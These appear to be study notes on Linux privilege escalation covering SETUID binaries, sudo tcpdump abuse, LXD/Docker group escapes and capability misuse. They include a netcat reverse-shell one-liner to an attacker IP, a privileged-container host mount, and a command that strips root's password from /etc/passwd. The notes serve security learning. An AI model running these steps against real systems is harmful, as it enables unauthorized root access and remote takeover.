##  1-Special Permissions
It may be possible to reverse engineer the program with the SETUID/SETGID bit set, identify a vulnerability, and exploit this to escalate our privileges.

**SETUID**
The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
**SETGID**
The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them
```bash
 find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
#### GTFOBins
The [GTFOBins](https://gtfobins.github.io) project is a curated list of binaries and scripts that can be used by an attacker to **bypass security restrictions,escalate privileges, spawn reverse shell connections, and transfer files.**
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id : uid=0(root) gid=0(root) groups=0(root)
```


---

## 2- Sudo Rights Abuse
Sudo privileges can be granted to an account (configured in `/etc/sudoers`)  permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges.
check to see if the current user has any sudo privileges
```bash
sudo -l 
  # (root) NOPASSWD: /usr/sbin/tcpdump
```
**NOPASSWD**: **CURRENT USER** password not required
an attacker could leverage `tcpdump` this to take advantage of a the **postrotate-command** option.
```bash
man tcpdump
# -z postrotate-command              
# Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```
By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script in file content , gain a reverse shell as the root user or run other privileged commands.

```bash
cat /tmp/.test 
  # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
nc -lnvp 443 # listener on our attacking box

sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
If all goes to plan, we will receive a root reverse shell connection.
#### Mitigation
 Newer distributions use **AppArmor** to restrict **postrotate commands**, preventing arbitrary command execution.  
 1. **Use absolute paths** in sudoers entries to prevent **PATH abuse**.
 2. **Apply least privilege** by granting only the required commands instead of full sudo access.

## 3- Privileged Groups
#### LXC / LXD
LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

```bash
$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```
Unzip the Alpine image.
```bash
unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```
Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.
```bash
lxd init
 # Do you want to configure a new storage pool (yes/no) [default=yes]? yes
 # Name of the storage backend to use (dir or zfs) [default=dir]: dir
 # Would you like LXD to be available over the network (yes/no) [default=no]? no
 # do you want to configure the LXD bridge (yes/no) [default=yes]? yes
 # /usr/sbin/dpkg-reconfigure must be run as root
 # error: Failed to configure the bridge
```
Import the local image.
```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

 # Generating a client certificate. This may take a minute...
 # If this is your first time using LXD, you should also run: sudo lxd init
 # To start your first container, try: lxc launch ubuntu:16.04

  # Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```
Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```bash
lxc init alpine r00t -c security.privileged=true
  # Creating r00t
```
Mount the host file system.
```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
  # Device mydev added to r00t
```
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.
```bash
lxc start r00t
  # devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
~ id
  # uid=0(root) gid=0(root)
```

####  Docker
Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.
#### Disk
Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.
#### ADM
Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```bash
cd /var/log
grep -r flag # apache2/access.log: /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps
```

We can use [aureport](https://linux.die.net/man/8/aureport) to read audit logs on Linux systems, with the man page describing it as "aureport is a tool that produces summary reports of the audit system logs."
```bash
 aureport --tty | less

1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```
---

## 4- Capabilities

 **Linux capabilities** allow assigning specific privileges to processes instead of full root access, providing finer-grained security than traditional Unix permissions.
 Misconfigured or overused capabilities can be **abused for privilege escalation**, especially when applied to poorly isolated executables.

 Capabilities are set using tools like `setcap`, which assigns privileges directly to binaries.
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```
Setting capabilities on a binary allows it to perform normally restricted actions (e.g., `cap_net_bind_service` lets it bind to network ports).

 Powerful capabilities like `cap_sys_admin` are dangerous if misused and can lead to **privilege escalation**, so they should only be granted to **well-sandboxed executables** and only when necessary.
 
|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|

examples of values that we can use with the `setcap` command, along with a brief description of what they do:

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |
Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

|**Capability**|**Description**|
|---|---|
|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|
|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|

#### Enumerating Capabilities
To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:
```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
output of this command will show a list of all binary executables on the system, along with the capabilities that have been set for each
####  Exploiting Capabilities
```bash
getcap /usr/bin/vim.basic
```
A binary with the `cap_dac_override` capability can be abused to **escalate privileges**, allowing the user to bypass file permissions.
We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:
```bash
cat /etc/passwd | head -n1
  # root:x:0:0:root:/root:/bin/bash   
```
x is the password palace , let reomve t to login with root wihtout password
```bash
/usr/bin/vim.basic /etc/passwd

# We also can make these changes in a non-interactive mode:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
  # root::0:0:root:/root:/bin/bash
```
Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.